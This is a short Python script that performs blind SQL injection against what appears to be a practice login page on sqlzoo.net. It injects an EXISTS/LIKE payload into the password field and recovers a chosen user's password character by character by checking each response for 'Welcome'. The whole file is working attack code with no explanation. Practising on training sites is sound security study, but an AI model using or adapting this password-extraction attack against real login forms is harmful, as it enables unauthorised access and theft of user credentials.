import requests

url = 'http://sqlzoo.net/hack/passwd.pl'
password = ""
name = input("Enter username: ")

for j in range(1,8):
    for i in range (ord('a'), ord('z')+1):
        i = chr(i)
        x = "' OR EXISTS(SELECT * FROM users WHERE name='" + name + "' AND password LIKE '" + password + i + "%') AND ''='"
        #print(x)
        values = {'name': name,'password': x}

        r = requests.post(url, data=values)
        #print(i)
        con = str(r.content)
        if "Welcome" in con:
            password += i
            print ("password: ", password)
            #print ("content: ", r.content)
        #else:
            #exit()
